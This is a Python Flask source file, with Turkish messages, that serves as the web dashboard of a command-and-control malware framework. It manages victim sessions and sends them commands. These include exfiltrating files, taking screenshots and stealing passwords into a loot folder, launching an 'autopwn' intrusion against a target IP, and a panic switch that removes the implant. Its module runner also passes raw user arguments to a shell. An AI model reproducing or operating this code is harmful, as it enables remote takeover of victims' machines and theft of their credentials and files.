import os
import sys
import threading
import base64
from flask import Flask, render_template, request, jsonify

# Flask App
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

# Import C2_Karargah
base_d = os.path.dirname(os.path.abspath(__file__))
sys.path.append(base_d)
import C2_Karargah

listener_running = False

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/status")
def status():
    return jsonify({
        "listener": listener_running,
        "sessions_count": len(C2_Karargah.active_sessions)
    })

@app.route("/api/start_listener", methods=["POST"])
def start_listener():
    global listener_running
    if listener_running:
        return jsonify({"status": "error", "message": "Dinleyici zaten aktif!"})
    
    port = request.json.get("port", 443)
    try:
        C2_Karargah.start_listener_background(port)
        listener_running = True
        return jsonify({"status": "success", "message": f"Dinleyici {port} portunda baslatildi."})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route("/api/sessions")
def sessions():
    sess_list = []
    for sid, sess in list(C2_Karargah.active_sessions.items()):
        sess_list.append({
            "id": sid,
            "ip": sess["addr"][0],
            "port": sess["addr"][1]
        })
    return jsonify({"sessions": sess_list})

@app.route("/api/command", methods=["POST"])
def send_command():
    data = request.json
    sid = data.get("session_id")
    cmd = data.get("command")
    
    if not sid or not cmd:
        return jsonify({"status": "error", "message": "Eksik parametre."})
        
    sid = int(sid)
    if sid not in C2_Karargah.active_sessions:
        return jsonify({"status": "error", "message": "Kurban baglantisi koptu."})
        
    sess = C2_Karargah.active_sessions[sid]
    
    # Handle upload command specially
    if cmd.startswith("!upload "):
        filename = cmd[8:].strip()
        local_path = os.path.join(base_d, "Ganimetler", filename)
        if not os.path.exists(local_path):
            return jsonify({"status": "error", "message": f"Dosya Ganimetler klasorunde bulunamadi: {filename}"})
        with open(local_path, "rb") as f:
            b64_data = base64.b64encode(f.read()).decode()
        cmd = f"!upload {os.path.basename(filename)} {b64_data}"
        
    if cmd == "!PANIK":
        try:
            C2_Karargah.send_and_recv(sess["conn"], "!suicide", sess["key"])
            sess["conn"].close()
            del C2_Karargah.active_sessions[sid]
            return jsonify({"status": "success", "output": "PANIK BUTONU TETIKLENDI! Kurban baglantisi kesildi ve zararli silindi."})
        except:
            pass

    try:
        resp = C2_Karargah.send_and_recv(sess["conn"], cmd, sess["key"])
        if resp is None:
            del C2_Karargah.active_sessions[sid]
            return jsonify({"status": "error", "message": "Kurban ile iletisim kesildi."})
            
        # Handle download
        if cmd.startswith("!download ") and resp.startswith("!DOWNLOAD_START!"):
            b64_data = resp.replace("!DOWNLOAD_START!", "")
            down_path = os.path.join(base_d, "Ganimetler", f"web_down_{sid}_{os.path.basename(cmd[10:].strip())}")
            with open(down_path, "wb") as f:
                f.write(base64.b64decode(b64_data))
            return jsonify({"status": "success", "output": f"Dosya basariyla Ganimetler klasorune indirildi: {down_path}"})
            
        # Handle screenshot
        if cmd == "!screenshot":
            img_data = base64.b64decode(resp)
            img_path = os.path.join(base_d, "Ganimetler", f"web_screenshot_{sid}.png")
            with open(img_path, "wb") as f:
                f.write(img_data)
            return jsonify({"status": "success", "output": f"Ekran goruntusu Ganimetler klasorune kaydedildi: {img_path}"})
            
        # Handle steal_passwords
        if cmd == "!steal_passwords":
            out_path = os.path.join(base_d, "Ganimetler", f"web_passwords_{sid}.txt")
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(resp)
            return jsonify({"status": "success", "output": f"Sifreler calindi ve kaydedildi: {out_path}\n\nOzet:\n{resp[:500]}..."})
            
        return jsonify({"status": "success", "output": resp})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route("/api/autopwn", methods=["POST"])
def autopwn():
    target = request.json.get("target")
    if not target:
        return jsonify({"status": "error", "message": "Hedef IP belirtilmedi."})
        
    def run_pwn():
        try:
            import Moduller.Oto_Sizma_Araci.Oto_Sizma_Araci as AutoPwn # wait, the path is Moduller.00_Oto_Sizma_Araci.Oto_Sizma_Araci
            # It's better to just use subprocess
            script = os.path.join(base_d, "Moduller", "00_Oto_Sizma_Araci", "Oto_Sizma_Araci.py")
            os.system(f"python \"{script}\" {target}")
        except: pass
        
    threading.Thread(target=run_pwn, daemon=True).start()
    return jsonify({"status": "success", "message": f"{target} icin Auto-Pwn arka planda baslatildi. Tamamlandiginda telefonunuza bildirim gelecek."})

@app.route("/api/categories")
def categories():
    cats = []
    mod_dir = os.path.join(base_d, "Moduller")
    if os.path.exists(mod_dir):
        for d in sorted(os.listdir(mod_dir)):
            if os.path.isdir(os.path.join(mod_dir, d)) and d not in ["Sistem", "Kurulum", "00_Oto_Sizma_Araci", "__pycache__"]:
                cats.append(d)
    return jsonify({"categories": cats})

@app.route("/api/modules/<category>")
def modules(category):
    mods = []
    cat_dir = os.path.join(base_d, "Moduller", category)
    if os.path.exists(cat_dir):
        for f in sorted(os.listdir(cat_dir)):
            if f.endswith('.py') or f.endswith('.bat'):
                mods.append(f)
    return jsonify({"modules": mods})

@app.route("/api/run_module", methods=["POST"])
def run_module_api():
    data = request.json
    cat = data.get("category")
    mod = data.get("module")
    args = data.get("args", "")
    
    if not cat or not mod:
        return jsonify({"status": "error", "message": "Eksik parametre."})
        
    script_path = os.path.join(base_d, "Moduller", cat, mod)
    if not os.path.exists(script_path):
        return jsonify({"status": "error", "message": "Modul bulunamadi."})
        
    try:
        import subprocess
        cmd = f"python \"{script_path}\" {args}" if script_path.endswith('.py') else f"\"{script_path}\" {args}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
        out = result.stdout + result.stderr
        return jsonify({"status": "success", "output": out if out else "Modul calisti fakat cikti uretmedi."})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == "__main__":
    os.makedirs(os.path.join(base_d, "Ganimetler"), exist_ok=True)
    print("🚀 Web Karargahı Başlatılıyor... http://127.0.0.1:5000 adresine gidin.")
    app.run(host="0.0.0.0", port=5000, debug=False)
